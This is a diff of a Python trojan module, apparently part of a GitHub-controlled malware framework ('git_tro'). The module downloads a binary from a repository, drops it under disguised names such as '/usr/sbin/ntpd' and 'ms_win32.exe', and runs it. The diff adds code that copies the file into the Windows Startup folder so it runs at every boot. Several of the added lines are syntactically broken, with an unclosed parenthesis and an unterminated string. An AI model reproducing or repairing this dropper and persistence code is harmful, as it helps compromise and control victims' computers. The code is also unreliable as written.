@@ -41,11 +41,11 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 	if os.name == 'posix':
 		filePath = "bin/test_svr" #"modules/dirlister.py" #
 		targetPath = "/usr/sbin/ntpd"
+		
 	elif os.name == 'nt': #TODO: CHeck win TargetPth
 		filePath = "bin/test" #"modules/dirlister.py" #
-		targetPath = "ms_win32.exe"
-		if winRunOnBoot == True:
-			targetPath = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\ms_win32.exe"
+		targetPath = os.getenv("PUBLIC")+"\ms_win32.exe"  #C:\Users\Public
+
 	else:
 		return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
 
@@ -57,11 +57,15 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 			    fich = open(targetPath, "wb")
 			    fich.write(content)
 			    fich.close()
+				if winRunOnBoot == True:
+					startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
+					os.system("copy %s %s"%(targetPath, startPath)
 			except PermissionError:
 				return ("[ERROR] getFileFromGit: Permission Denied!")
 
 			if start and os.name == 'nt':
-				os.system("start '{}'".format(targetPath.replace('/','\\')))
+				targetPath=targetPath.replace('\\','\\')
+				os.system("start {}".format(targetPath.split('\')[0]))   #format(targetPath.replace('/','\\')))
 			elif start and os.name == 'posix':
 			    os.system("chmod 777 {}".format(targetPath))
 			    os.system("./{}".format(targetPath))
